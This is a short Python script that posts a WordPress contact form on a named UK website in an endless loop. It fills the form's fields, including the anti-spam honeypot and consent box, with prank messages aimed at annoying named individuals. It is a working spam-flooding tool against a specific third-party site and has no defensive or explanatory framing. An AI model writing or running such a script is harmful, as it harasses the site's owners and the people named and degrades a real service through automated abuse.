import requests
import json
import random

url = 'https://teamambiente.co.uk/contact/'

while True:
    username = ""
    for i in range (random.randint(5, 15)):
        l = chr(random.randint(97, 122))
        username += l

    firstname = ""
    for i in range (random.randint(4, 6)):
        l = chr(random.randint(97, 122))
        firstname += l

    lastname = ""
    for i in range (random.randint(4, 6)):
        l = chr(random.randint(97, 122))
        lastname += l

    firstname = "Sorry My dudes"
    lastname = "GET PRANKD"
    username = "My apologies"

    requests.post(url, allow_redirects=False, data={
        'wpforms[fields][0][first]': firstname,
        'wpforms[fields][0][last]': lastname,
        'wpforms[fields][1]': "{}@{}.com".format(firstname, lastname),
        'wpforms[fields][2]': "Sorry molly Im only doing this to annoy peggy *Dibbedy Dabbedy*",
        'wpforms[fields][3]': "I consent to having this website store my submitted information so they can respond to my inquiry.",
        'wpforms[hp]': None,
        'wpforms[id]': 296,
        'wpforms[author]': 1,
        'wpforms[post_id]': 220,
        'wpforms[submit]': "wpforms-submit"
    })

    print('sending username %s' % username)